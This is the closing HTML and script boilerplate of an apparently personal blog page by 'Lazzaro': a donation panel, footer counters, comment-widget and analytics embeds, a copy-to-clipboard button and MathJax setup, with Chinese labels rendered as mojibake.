class="text-grey">æ‰“å¼€æ”¯ä»˜å®æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµæ¿€åŠ±å“¦~</p></div><div role="tabpanel" class="tab-pane fade" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµæ¿€åŠ±å“¦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> æ”¯ä»˜å®</a></li><li role="presentation"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> å¾®ä¿¡æ”¯ä»˜</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2022 Lazzaro<br><span>æ€»è®¿é—® - <span id="busuanzi_value_site_pv"></span>æ¬¡</span><br><span>è®¿å®¢æ•° - <span id="busuanzi_value_site_uv"></span>äºº</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"æ–‡ç« ",PAGES:"é¡µé¢",CATEGORIES:"ç±»åˆ«",TAGS:"å…³é”®è¯",UNTITLED:"(æœªå‘½å)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"æ¥æ¥æ¥è¯´ç‚¹å•¥~~\r\nå¯¹ä½ æœ‰ç”¨ï¼Ÿèµä¸€æ³¢ï¼â†˜â†˜",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><script defer>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?e7553a1c385e5487b8ef58cd5738e112";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("å¤åˆ¶").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* å¤åˆ¶å¹¶ä½¿ç”¨ä»£ç è¯·æ³¨æ˜å¼•ç”¨å‡ºå¤„å“¦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("å¤åˆ¶æˆåŠŸ"):$(this).text("å¤åˆ¶å¤±è´¥"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("å¤åˆ¶")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>